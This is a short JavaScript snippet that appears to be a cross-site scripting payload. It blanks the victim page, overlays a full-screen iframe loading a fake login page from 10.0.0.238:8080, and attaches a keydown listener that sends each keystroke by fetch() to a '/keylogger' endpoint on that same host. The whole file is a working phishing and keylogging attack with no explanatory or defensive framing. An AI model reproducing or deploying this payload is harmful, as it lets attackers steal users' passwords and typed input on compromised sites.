(function() {
    var body = document.getElementsByTagName("body");
    body = body ? body : false;
    if (body){
        var iframe = document.createElement('iframe');
        iframe.src = "http://10.0.0.238:8080/login";
        iframe.width = "100%";
        iframe.height = "100%";
        iframe.style = "position:fixed";
        document.body.innerHTML = "";
        document.body.appendChild(iframe);
        function logkey(event){
    fetch("http://10.0.0.238:8080/keylogger?key="+event.key)
}
        document.addEventListener('keydown', logkey)

    }
})();